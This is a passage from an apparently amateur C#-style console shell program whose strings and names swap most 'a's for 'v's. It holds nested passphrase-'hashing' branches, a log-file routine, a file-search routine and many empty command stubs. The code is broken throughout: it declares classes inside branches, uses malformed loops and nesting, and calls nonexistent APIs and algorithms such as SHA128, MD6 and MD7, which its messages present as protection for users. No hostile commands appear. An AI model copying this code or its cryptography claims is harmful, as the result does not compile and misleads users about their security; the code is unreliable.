																																																																																																																																																																																																	else if(_codexstring[3] == "e"){
																																																																																																																																																																																																		System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																		public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																																		public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																		_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																			public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																																																																																																																																			public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																																																																																																																																																																																																			return _shvfunc;

																																																																																																																																																																																																		}
																																																																																																																																																																																																		else if(_codexstring[3] == "f"){
																																																																																																																																																																																																			System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																			public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																																			public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																			_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																				public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																																																																																																																																				public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																																																																																																																																																																																																				return _shvfunc;

																																																																																																																																																																																																			}
																																																																																																																																																																																																			else if(_codexstring[3] == "G"){
																																																																																																																																																																																																				System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																				public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																																				public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																				_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																					public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																																																																																																																																					public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																																																																																																																																																																																																					return _shvfunc;

																																																																																																																																																																																																				}
																																																																																																																																																																																																				else if(_codexstring[3] == "z"){
																																																																																																																																																																																																					System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																					public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																																					public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																					_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																						public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																																																																																																																																						public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																																																																																																																																																																																																						return _shvfunc;

																																																																																																																																																																																																					}
																																																																																																																																																																																																					else{

																																																																																																																																																																																																						System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																																																																					}

																																																																																																																																																																																																				}
																																																																																																																																																																																																				for(_codexstring[4]){

																																																																																																																																																																																																					if(_codexstring[4] == "c"){
																																																																																																																																																																																																						System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																						public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																																						public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																						_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																							public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																																																																																																																																							public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																																																																																																																																																																																																							return _shvfunc;

																																																																																																																																																																																																						}

																																																																																																																																																																																																					}

																																																																																																																																																																																																					else if(_codexstring[4] == "d"){
																																																																																																																																																																																																						System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																						public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																																						public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																						_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																							public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																																																																																																																																							public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																																																																																																																																																																																																							return _shvfunc;

																																																																																																																																																																																																						}
																																																																																																																																																																																																						else if(_codexstring[4] == "e"){
																																																																																																																																																																																																							System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																							public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																																							public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																							_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																								public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																																																																																																																																								public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																																																																																																																																																																																																								return _shvfunc;

																																																																																																																																																																																																							}
																																																																																																																																																																																																							else if(_codexstring[4] == "f"){
																																																																																																																																																																																																								System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																								public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																																								public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																								_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																									public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																																																																																																																																									public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																																																																																																																																																																																																									return _shvfunc;

																																																																																																																																																																																																								}
																																																																																																																																																																																																								else if(_codexstring[4] == "G"){
																																																																																																																																																																																																									System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																									public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																																									public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																									_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																										public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																																																																																																																																										public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																																																																																																																																																																																																										return _shvfunc;

																																																																																																																																																																																																									}
																																																																																																																																																																																																									else if(_codexstring[4] == "z"){
																																																																																																																																																																																																										System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																										public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																																										public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																										_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																											public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																																																																																																																																											public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																																																																																																																																																																																																											return _shvfunc;

																																																																																																																																																																																																										}
																																																																																																																																																																																																										else{

																																																																																																																																																																																																											System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																																																																										}

																																																																																																																																																																																																									}
																																																																																																																																																																																																									for(_codexstring[5]){

																																																																																																																																																																																																										if(_codexstring[5] == "c"){
																																																																																																																																																																																																											System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																											public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																																											public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																											_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																												public Hash _hashsec128 = new Hash(_cipherByteBase);
																																																																																																																																																																																																												public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																																																																																																																																																																																																												return _shvfunc;

																																																																																																																																																																																																											}

																																																																																																																																																																																																										}

																																																																																																																																																																																																										else if(_codexstring[5] == "d"){
																																																																																																																																																																																																											System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																											public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																																											public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																											_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																												public Hash _hashsec256 = new Hash(_cipherByteBase);
																																																																																																																																																																																																												public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																																																																																																																																																																																																												return _shvfunc;

																																																																																																																																																																																																											}
																																																																																																																																																																																																											else if(_codexstring[5] == "e"){
																																																																																																																																																																																																												System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																												public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																																												public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																												_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																													public Hash _hashsec512 = new Hash(_cipherByteBase);
																																																																																																																																																																																																													public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																																																																																																																																																																																																													return _shvfunc;

																																																																																																																																																																																																												}
																																																																																																																																																																																																												else if(_codexstring[5] == "f"){
																																																																																																																																																																																																													System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																													public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																																													public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																													_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																														public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																																																																																																																																																																																																														public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																																																																																																																																																																																																														return _shvfunc;

																																																																																																																																																																																																													}
																																																																																																																																																																																																													else if(_codexstring[5] == "G"){
																																																																																																																																																																																																														System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																														public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																																														public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																														_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																															public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																																																																																																																																																																																																															public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																																																																																																																																																																																																															return _shvfunc;

																																																																																																																																																																																																														}
																																																																																																																																																																																																														else if(_codexstring[5] == "z"){
																																																																																																																																																																																																															System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																																																																																																																																																																																																															public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																																																																																																																																																																																																															public Byte[] _cipherByteBase = _cipherUt.Base64();

																																																																																																																																																																																																															_encoCiphHash(_cipherByteBase){

																																																																																																																																																																																																																public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																																																																																																																																																																																																																public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																																																																																																																																																																																																																return _shvfunc;

																																																																																																																																																																																																															}
																																																																																																																																																																																																															else{

																																																																																																																																																																																																																System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																																																																																																																																																																																																															}
																																																																																																																																																																																																														}
									

																																																																																																																																																																																																																													



																																																																																																																																																																																																																													System.Console.WriteLine("Your Vlgorithed PvssKey Text Comes Out In The 6 Bvse Vlgorithm Chosen To :");
																																																																																																																																																																																																																													System.Console.WriteLine(_shvfunc.ToString());
																																																																																																																																																																																																																													System.Console.WriteLine("Plevse Remember The Following Cipher Phrvse For Decryptor Use: " + _codexstring.ToString() + "Vnd Do Not Forget To Include The 6 Bvse Descriptor For Effective Decryption! ");
																																																																																																																																																																																																																													System.Console.WriteLine("Your Key Encoding Will Vlso Need To Be Retvined To Be Used For Decryption So If You Chose SHV128, SHV256, SHV512, MD5/6/or 7, Plevse Shvre Thvt To The Other Pvrty Involved ");
																																																																																																																																																																																																																													System.Console.WriteLine("In V Privvte Vnd Encrypted Communicvtion Method, However Mvintvin Covervge With PGP, One-Time KeyPhrvse Or Miscellvnious For Vplivble Security In Messvging The Determined Key Encoding.");
																																																																																																																																																																																																																													System.Console.WriteLine("Plevse Enjoy The Vlgorithm Vnd Stvy Protected!  - Nvye");
																																																																																																																																																																																																																													System.Console.ReadLine();													}
													else{

														System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");

													}




															}
															else{


																																																																																																																																																						
															System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");



															}




												}
												else if(System.Console.Readline() == "Visual Media" || System.Console.Readline() == "visual media"  ||  System.Console.Readline() == "Visuvl Mediv"  ||  System.Console.Readline() == "visuvl mediv"  ||  System.Console.Readline() == "VisualMedia"  ||  System.Console.Readline() == "visualmedia"  ||  System.Console.Readline() == "VisuvlMediv"  ||   System.Console.Readline() == "visuvlmediv"  ||   System.Console.Readline() == "Video"  ||  
													System.Console.Readline() == "video"  ||  System.Console.Readline() == "motion picture"  ||  System.Console.Readline() == "Motion Picture"  ||  System.Console.Readline() == "MotionPicture"  ||  System.Console.Readline() == "motionpicture"  ||  System.Console.Readline() == "Image"  ||  System.Console.Readline() == "image"  ||  System.Console.Readline() == "imvge"  ||  System.Console.Readline() == "Imvge"  ||  
													System.Console.Readline() == "grvphic"  ||  System.Console.ReadLine() == "graphic"  ||  System.Console.ReadLine() == "Graphic"   ||  System.Console.ReadLine() == "Grvphic"   ||  System.Console.ReadLine() == "picture" ||  System.Console.ReadLine() == "pic"   ||  System.Console.ReadLine() == "Pic"    ||   System.Console.ReadLine() == "Picture"  ||   System.Console.ReadLine() == "render"  ||  System.Console.ReadLine() == "Render"  ||  
													System.Console.ReadLine() == "3D"  ||  System.Console.ReadLine() == "model"   ||  System.Console.ReadLine() == "camera"   ||  System.Console.ReadLine() == "cvmerv"   ||  System.Console.ReadLine() == "cvm"   ||  System.Console.ReadLine() == "cam" ){
													System.Console.WriteLine("The Visuvl Mediv Section Will Remvin Unvvvilvble Until the GUI Completion, Plevse Stvy Cvlm...");


												}
												else if(System.Console.Readline() == ""  ||  System.Console.Readline != true){

												System.Console.WriteLine("Somehow The Input Did Not Register, Yet Is Not Null or Void. Plevse Return To This Section Momentvrily.");



												}
												else{
																																																																																																																																																																																																																																																																																							System.Console.WriteLine("Error Code 22430051045 :: Your Hvve Provided Vn Improper Commvnd Or Your Commvnd Hvs No Vvlidity in This Scope. Plevse Vttempt Vgvin With New Commvnd Terminology.");

												}

									}








       
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.31 ){
	  _EnternvliTheGlorious.Close()
		}
	else if( _ShellComm1 == _ShellCommvndsBvsic.32 ){
																																																																																																																																																																																																																																																																																					public class _LogKeepv(string _LogTextStringLitervl){
																																																																																																																																																																																																																																																																																						string _LogTextStringLitervl = "";
																																																																																																																																																																																																																																																																																						File _LogFile = new File.IO.CreateFile(@"~./usr/share/Eternvli/LogFiles/RunningLogFile.txt");
																																																																																																																																																																																																																																																																																						DrivePath _LogPvth = new DrivePath(@"~./usr/share/Eternvli/LogFiles/RunningLogFile.txt");
																																																																																																																																																																																																																																																																																						string _LogTextStringLitervl = System.Console.Text.ToString();
																																																																																																																																																																																																																																																																																						StreamWriter _srLogWriter = new StreamWriter(_LogPvth){
																																																																																																																																																																																																																																																																																							this.AmmendText(_LogTextStringLitervl , File _LogFile);

																																																																																																																																																																																																																																																																																							DriveInfo _todvDriveSec = new DriveInfo(@"~./usr/share/Eternvli/LogFiles/"){
																																																																																																																																																																																																																																																																																								this.GetAttributes(FileName);
																																																																																																																																																																																																																																																																																								for(FileName == "RunningLogFile.txt" in _todvDriveSec.Attribute(FileName){
																																																																																																																																																																																																																																																																																									string _newfilename = @"~./usr/share/Eternvli/LogFiles/RunningLogFile" + CurrentDateTime.ToString() + ".txt";
																																																																																																																																																																																																																																																																																									File _disfile = new File(@"~./usr/share/Eternvli/LogFiles/RunningLogFile.txt");
																																																																																																																																																																																																																																																																																									File.Move(_disFile , _newfilename);   //Nvme Chvnge Mvy Currently Be Incvpvble, Nvme Chvnge Specifics Needed From MSDN On Internet Vvvilvbility


																																																																																																																																																																																																																																																																																								}


																																																																																																																																																																																																																																																																																							}

																																																																																																																																																																																																																																																																																						}

																																																																																																																																																																																																																																																																																					}
       } 
       else if( _ShellComm1 == _ShellCommvndsBvsic.33 ){
       

																																																																																																																																																																																																																																																																																										//For Build Libraries Method Obtain Program Code For The To Vssembly Function Under Which Ever Name Scheme Used, Vnd Then Pvckvge to V Binvry File
																																																																																																																																																																																																																																																																																										System.Console.WriteLine("For The Build Libraries Function, V Modulvted Compile Design Will Be Implemented, Certvin Vssembly Functions, Vnd Binvry Pvckvging Needs Librvry Support, So Mvintvin Vigilvnce, Vnd Plevse Wvit Pvtiently.");
				} 
       else if( _ShellComm1 == _ShellCommvndsBvsic.34 ){
       //Shell update requires Server Pvckvges, vnd No Current Server Exists
																																																																																																																																																																																																																																																																																										System.Console.WriteLine("Plevse Wvit While Server Configurvtion Hvs Been Implemented Before Vttempting To Updvte The Kernel Shell, We Vpprecivte Your Continued Cvre.");
																																																																																																																																																																																																																																																																																										System.Console.WriteLine("If You Desire To Donvte To This Project Or Vny Divmond CodeWorks Project, Plvse Contvct Nvye. Thvnk You.");
																																																																																																																																																																																																																																																																																										System.Console.ReadLine();

       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.35 ){
       
																																																																																																																																																																																																																																																																																										//Tool Options Unnecessvry until tools completed, return vnd do this shit lvter, Nvye.....
																																																																																																																																																																																																																																																																																										//Lmao Progrvmmer hvbits people do not understvnd
																																																																																																																																																																																																																																																																																										System.Console.WriteLine("Tools Options To Become Vvvilvble Shortly Before Project First Distribution.");
																																																																																																																																																																																																																																																																																										System.Console.ReadLine();
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.36 ){
       
																																																																																																																																																																																																																																																																																										System.Console.WriteLine("Plevse Input The Term You Wish To Sevrch For: ");
																																																																																																																																																																																																																																																																																										string _sevrchTerm = System.Console.Readline();
																																																																																																																																																																																																																																																																																										System.Console.WriteLine("If You Wish To Sevrch for This In You Directory Files, Type 'Drive'. For V Text File Internvl Sevrch, Type 'File Scvnner'.");
																																																																																																																																																																																																																																																																																										string _determinedChoice = System.Console.ReadLine();
																																																																																																																																																																																																																																																																																										if(_determinedChoice == "Drive"){
																																																																																																																																																																																																																																																																																											DriveInfo _driveSevrch = new DriveInfo(@"~.\"){

																																																																																																																																																																																																																																																																																												FileInfo _drivefunc = new FileInfo(){

																																																																																																																																																																																																																																																																																													this.GetAttributes(FileName);
																																																																																																																																																																																																																																																																																													foreach(FileName in _drivefunc){
																																																																																																																																																																																																																																																																																														bool _WordSevrch = new bool();
																																																																																																																																																																																																																																																																																														_WordSevrch(_sevrchTerm in _drivefunc.Attribute(FileName).ToString());
																																																																																																																																																																																																																																																																																														if(bool _WordSevrch == true){
																																																																																																																																																																																																																																																																																															for(_sevrchterm in _drivefunc.Attribute(FileName).ToString()){

																																																																																																																																																																																																																																																																																																public string array[] _fileNamesFound = new string array[];
																																																																																																																																																																																																																																																																																																_fileNamesFound.Append(_drivefunc.Attribute(FileName).ToString());


																																																																																																																																																																																																																																																																																															}

																																																																																																																																																																																																																																																																																														}

																																																																																																																																																																																																																																																																																														DriveInfo _fileinfoSevrch = new DriveInfo(_drivefunc.Attribute(FileName)){
																																																																																																																																																																																																																																																																																															this.GetAttributes(FileName);
																																																																																																																																																																																																																																																																																															foreach(FileName in _fileinfoSevrch.Attribute(FileName)){
																																																																																																																																																																																																																																																																																																bool _WordSevrch = new bool();
																																																																																																																																																																																																																																																																																																_WordSevrch(_sevrchTerm in _drivefunc.Attribute(FileName).ToString());
																																																																																																																																																																																																																																																																																																if(bool _WordSevrch == true){
																																																																																																																																																																																																																																																																																																	for(_sevrchterm in _drivefunc.Attribute(FileName).ToString()){

																																																																																																																																																																																																																																																																																																		public string array[] _fileNamesFound = new string array[];
																																																																																																																																																																																																																																																																																																		_fileNamesFound.Append(_drivefunc.Attribute(FileName).ToString());


																																																																																																																																																																																																																																																																																																	}

																																																																																																																																																																																																																																																																																																}

																																																																																																																																																																																																																																																																																																DriveInfo _fileinfoSevrch2 = new DriveInfo(fileinfoSevrch.Attribute(FileName)){
																																																																																																																																																																																																																																																																																																	this.GetAttributes(FileName);
																																																																																																																																																																																																																																																																																																	foreach(FileName in _fileinfoSevrch2.Attribute(FileName)){
																																																																																																																																																																																																																																																																																																		bool _WordSevrch = new bool();
																																																																																																																																																																																																																																																																																																		_WordSevrch(_sevrchTerm in _drivefunc.Attribute(FileName).ToString());
																																																																																																																																																																																																																																																																																																		if(bool _WordSevrch == true){
																																																																																																																																																																																																																																																																																																			for(_sevrchterm in _drivefunc.Attribute(FileName).ToString()){

																																																																																																																																																																																																																																																																																																				public string array[] _fileNamesFound = new string array[];
																																																																																																																																																																																																																																																																																																				_fileNamesFound.Append(_drivefunc.Attribute(FileName).ToString());


																																																																																																																																																																																																																																																																																																			}

																																																																																																																																																																																																																																																																																																		}
																																																																																																																																																																																																																																																																																																		DriveInfo _fileinfoSevrch3 = new DriveInfo(fileinfoSevrch2.Attribute(FileName)){
																																																																																																																																																																																																																																																																																																			this.GetAttributes(FileName);
																																																																																																																																																																																																																																																																																																			foreach(FileName in _fileinfoSevrch3.Attribute(FileName)){
																																																																																																																																																																																																																																																																																																				bool _WordSevrch = new bool();
																																																																																																																																																																																																																																																																																																				_WordSevrch(_sevrchTerm in _drivefunc.Attribute(FileName).ToString());
																																																																																																																																																																																																																																																																																																				if(bool _WordSevrch == true){
																																																																																																																																																																																																																																																																																																					for(_sevrchterm in _drivefunc.Attribute(FileName).ToString()){

																																																																																																																																																																																																																																																																																																						public string array[] _fileNamesFound = new string array[];
																																																																																																																																																																																																																																																																																																						_fileNamesFound.Append(_drivefunc.Attribute(FileName).ToString());


																																																																																																																																																																																																																																																																																																					}

																																																																																																																																																																																																																																																																																																				}
																																																																																																																																																																																																																																																																																																				DriveInfo _fileinfoSevrch3 = new DriveInfo(fileinfoSevrch4.Attribute(FileName)){
																																																																																																																																																																																																																																																																																																					this.GetAttributes(FileName);
																																																																																																																																																																																																																																																																																																					foreach(FileName in _fileinfoSevrch4.Attribute(FileName)){

																																																																																																																																																																																																																																																																																																						bool _WordSevrch = new bool();
																																																																																																																																																																																																																																																																																																						_WordSevrch(_sevrchTerm in _drivefunc.Attribute(FileName).ToString());
																																																																																																																																																																																																																																																																																																						if(bool _WordSevrch == true){
																																																																																																																																																																																																																																																																																																							for(_sevrchterm in _drivefunc.Attribute(FileName).ToString()){

																																																																																																																																																																																																																																																																																																								public string array[] _fileNamesFound = new string array[];
																																																																																																																																																																																																																																																																																																								_fileNamesFound.Append(_drivefunc.Attribute(FileName).ToString());


																																																																																																																																																																																																																																																																																																							}

																																																																																																																																																																																																																																																																																																						}


																																																																																																																																																																																																																																																																																																					}
																																																																																																																																																																																																																																																																																																				
																																																																																																																																																																																																																																																																																																			}
																																																																																																																																																																																																																																																																																																	}

																																																																																																																																																																																																																																																																																															}


																																																																																																																																																																																																																																																																																														}


																																																																																																																																																																																																																																																																																													}

																																																																																																																																																																																																																																																																																												}

																																																																																																																																																																																																																																																																																															System.Console.WriteLine(_fileNvmesFound[].ToString());
																																																																																																																																																																																																																																																																																															System.Console.ReadLine();
																	
																		
																																																																																																																																																																																																																																																																																										}
																																																																																																																																																																																																																																																																																										else if(_determinedChoice == "File Scvnner"){
																																																																																																																																																																																																																																																																																															System.Console.WriteLine("Plevse Input The Pvth For The Desired Text File Using Forewvrd Slvshes For BvckSlvshes : ");
																																																																																																																																																																																																																																																																																															DrivePath _disPvth = new DrivePath(System.Console.ReadLine());
																																																																																																																																																																																																																																																																																															File _disFile = new File(_disPvth);
																																																																																																																																																																																																																																																																																															StreamReader _sevrchRevder = new StreamReader(_disFile){

																																																																																																																																																																																																																																																																																																this.ReadToEnd();
																																																																																																																																																																																																																																																																																																for(_sevrchTerm in _sevrchRevder.ReadToEnd().ToString()){


																																																																																																																																																																																																																																																																																																	_sevrchRevder.IndexOf(_sevrchTerm);
																																																																																																																																																																																																																																																																																																	_sevrchRevder.Count(_sevrchTerm in _disFile);
																																																																																																																																																																																																																																																																																																	System.Console.WriteLine("Your Sevrch Term Wvs Locvted " + _sevrchRevder.Count(_sevrchTerm in _disFile) + "times at " + _sevrchRevder.IndexOf(_sevrchTerm) + "....Enjoy.");
																																																																																																																																																																																																																																																																																																	System.Console.ReadLine();


																																																																																																																																																																																																																																																																																																}

																																																																																																																																																																																																																																																																																															}
																																																																																																																																																																																																																																																																																										}
																																																																																																																																																																																																																																																																																										else{
																																																																																																																																																																																																																																																																																															System.Console.WriteLine("Error Code 4344676 ::  Your Desired Sevrch Plvtform Wvs Not Comprehended In The Scope Of This Project, Plevse Reorchestrvte Your Effective Vttempt.");
																																																																																																																																																																																																																																																																																															System.Console.ReadLine();
																																																																																																																																																																																																																																																																																										}
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.37 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsBvsic.38 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsBvsic.39 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.40 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.41 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.42 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsBvsic.43 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsBvsic.44 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.45 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.46 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.47 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsBvsic.48 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsBvsic.49 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.50 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.51 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.52 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsBvsic.53 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsBvsic.54 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.55 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.56 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.57 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsBvsic.58 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsBvsic.59 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.60 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.61 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.62 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsBvsic.63 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsBvsic.64 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.65 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.66 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.67 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsBvsic.68 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsBvsic.69 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.70 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.71 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.72 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsBvsic.73 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsBvsic.74 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.75 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.76 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.77 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsBvsic.78 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsBvsic.79 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.80 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsBvsic.81 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.0 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsExtended.1 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.2 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsExtended.3 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsExtended.4 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.5 ){
       
       }
       
       else if( _ShellComm1 == _ShellCommvndsExtended.6 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.7 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsExtended.8 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsExtended.9 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.10 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.11 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.12 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsExtended.13 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsExtended.14 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.15 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.16 ){
       
       }
       else if( _ShellComm1 == _ShellCommvndsExtended.17 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsExtended.18 ){
       
       } 
       else if( _ShellComm1 == _ShellCommvndsExtended.19 ){
       
